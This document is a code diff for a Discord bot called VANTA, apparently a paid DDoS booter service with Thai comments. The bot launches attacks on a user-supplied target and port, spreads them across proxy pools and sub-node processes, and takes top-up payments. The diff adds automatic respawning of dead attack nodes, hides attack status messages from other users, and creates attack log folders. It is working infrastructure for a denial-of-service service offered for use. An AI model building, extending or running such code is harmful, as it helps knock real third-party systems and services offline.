@@ -14,6 +14,7 @@ from discord.ext import commands, tasks
 from config import (
     BASE_DIR, BOT_TOKEN, PREFIX, OWNER_ID, LOG_CHANNEL_ID,
     MAX_DURATION, MAX_DEVICES_PURCHASE, MAX_WARNINGS,
+    MAX_RESPAWN_ATTEMPTS,
     FORBIDDEN_TLDS, FORBIDDEN_IPS,
     SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
 )
@@ -130,6 +131,7 @@ async def on_ready():
 
     os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
     os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, "data", "attack_logs"), exist_ok=True)
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
 
@@ -204,10 +206,7 @@ async def proxy_status(ctx):
         return
     pool = len(proxy_mgr.proxies or [])
     ready = "✅" if proxy_mgr.ready.is_set() else "⏳ กำลังโหลด"
-    await ctx.send(
-        f"**Proxy pool:** {pool} live {ready}\n"
-        f"**Sources:** {len(proxy_mgr.__class__.__dict__) and 2 or 0}"
-    )
+    await ctx.send(f"**Proxy pool:** {pool} live {ready}")
 
 
 # ============================================================
@@ -295,9 +294,10 @@ async def start_attack(interaction: discord.Interaction, module: str,
         )
         return
 
+    # defer แบบ ephemeral — ทั้ง flow ซ่อน 2 ต่อ 2
     await interaction.response.defer(ephemeral=True)
 
-    # รอ proxy pool ถ้ายังไม่พร้อม — max 30 วิ
+    # รอ proxy pool — max 30 วิ
     if not proxy_mgr.ready.is_set():
         try:
             await asyncio.wait_for(proxy_mgr.ready.wait(), timeout=30)
@@ -309,9 +309,9 @@ async def start_attack(interaction: discord.Interaction, module: str,
     slices = proxy_mgr.slice_for_subnodes(sub_nodes)
     pool_size = len(proxy_mgr.proxies or [])
 
-    # spawn sub-processes
+    # spawn
     try:
-        procs = await engine.start(user_id, module, target,
+        nodes = await engine.start(user_id, module, target,
                                     port, duration, devices, slices)
     except Exception as e:
         await interaction.followup.send(
@@ -328,11 +328,11 @@ async def start_attack(interaction: discord.Interaction, module: str,
     embed = build_attack_running_embed(
         target=f"{target}:{port}", time_left=duration,
         speed="measuring...", module=module,
-        nodes=f"{len(procs)}/{len(procs)}",
+        nodes=f"{len(nodes)}/{len(nodes)}",
         proxies=str(pool_size),
         with_image=bool(f),
     )
-    kwargs = {"embed": embed}
+    kwargs = {"embed": embed, "ephemeral": True}
     if f:
         kwargs["file"] = f
     try:
@@ -340,12 +340,6 @@ async def start_attack(interaction: discord.Interaction, module: str,
     except Exception as e:
         await engine.stop(user_id)
         traceback.print_exc()
-        try:
-            await interaction.followup.send(
-                f"สร้าง attack message ไม่สำเร็จ: {e}", ephemeral=True
-            )
-        except discord.HTTPException:
-            pass
         return
 
     state = {
@@ -353,12 +347,14 @@ async def start_attack(interaction: discord.Interaction, module: str,
         "module": module, "devices": devices,
         "start": time.time(), "message": msg,
         "has_image": bool(f),
-        "total_nodes": len(procs),
+        "total_nodes": len(nodes),
         "pool_size": pool_size,
     }
     active_attacks[user_id] = state
     task = asyncio.create_task(_attack_loop(user_id, state))
     state["task"] = task
+    # เปิด watcher สำหรับ respawn
+    asyncio.create_task(engine._watcher(user_id))
 
 
 async def _attack_loop(user_id: int, state: dict):
@@ -366,7 +362,6 @@ async def _attack_loop(user_id: int, state: dict):
     target_full = f"{state['target']}:{state['port']}"
     duration = state["duration"]
     is_l4 = state["module"] in L4_MODULES
-    total_nodes = state["total_nodes"]
 
     try:
         while True:
@@ -387,24 +382,27 @@ async def _attack_loop(user_id: int, state: dict):
                     pass
                 return
 
-            # เช็ค sub-processes
+            # นับ alive
             alive, total = engine.alive_count(user_id)
 
-            # ตายหมดแล้ว
+            # ตายหมดจริงๆ (respawn เกิน limit แล้ว)
             if alive == 0 and total > 0:
                 engine.running.pop(user_id, None)
                 active_attacks.pop(user_id, None)
                 try:
                     await msg.edit(embed=discord.Embed(
                         title="⚠️ Attack หยุดกลางทาง",
-                        description=f"sub-process ตายทั้งหมด ({total} nodes)",
+                        description=(
+                            f"ทุก node respawn เกิน "
+                            f"{MAX_RESPAWN_ATTEMPTS} ครั้ง"
+                        ),
                         color=discord.Color.orange(),
                     ))
                 except discord.HTTPException:
                     pass
                 return
 
-            # update embed
+            # update
             if is_l4:
                 speed = "N/A (L4)"
             else:
@@ -719,8 +717,9 @@ async def topup_cmd(ctx, link: str = None):
 def _install_signal_handlers():
     def _shutdown(sig, frame):
         print(f"\n[VANTA] signal {sig} received — shutting down")
-        for uid, procs in list(engine.running.items()):
-            for proc, _ in procs:
+        for uid, nodes in list(engine.running.items()):
+            for node in nodes:
+                proc = node["proc"]
                 if proc.returncode is None:
                     try:
                         proc.terminate()
@@ -745,5 +744,6 @@ if __name__ == "__main__":
         )
     os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
     os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, "data", "attack_logs"), exist_ok=True)
     _install_signal_handlers()
     bot.run(BOT_TOKEN)
